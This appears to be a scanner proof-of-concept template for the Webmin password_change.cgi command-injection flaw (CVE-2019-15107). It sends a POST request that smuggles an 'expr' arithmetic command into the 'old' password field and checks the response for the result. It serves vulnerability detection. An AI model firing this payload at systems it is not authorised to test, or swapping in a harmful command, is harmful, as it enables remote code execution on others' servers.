detail:
  author: danta
  description: "Webmin \u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\uFF08CVE-2019-15107\uFF09"
  links:
  - https://github.com/vulhub/vulhub/tree/master/webmin/CVE-2019-15107
expression: r0()
manual: true
name: poc-yaml-webmin-cve-2019-15107-rce
rules:
  r0:
    expression: response.body.bcontains(bytes(string(r1 + r2)))
    request:
      body: user=roovt&pam=&expired=2&old=expr%20{{r1}}%20%2b%20{{r2}}&new1=test2&new2=test2
      cache: true
      follow_redirects: false
      headers:
        Referer: '{{url}}'
      method: POST
      path: /password_change.cgi
set:
  r1: randomInt(800000000, 1000000000)
  r2: randomInt(800000000, 1000000000)
  url: request.url
transport: http
